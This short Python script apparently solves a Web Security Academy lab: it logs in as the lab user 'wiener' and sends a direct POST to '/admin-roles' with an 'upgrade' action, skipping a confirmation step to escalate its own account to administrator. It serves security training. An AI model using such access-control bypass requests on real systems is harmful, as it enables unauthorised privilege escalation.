from web_security_academy.core.logger import logger


def solve_lab(session, *args):
    session.login("wiener", "peter", with_csrf=False)

    data = {"username": "wiener", "action": "upgrade", "confirmed": "true"}
    logger.info('Sending a POST request to "/admin-roles" with the following data:')
    logger.info(data)
    resp = session.post_path("/admin-roles", data=data)

    if resp.status_code != 200:
        logger.failure("Did not get expected 200 status code.")
    else:
        logger.success("Success.")
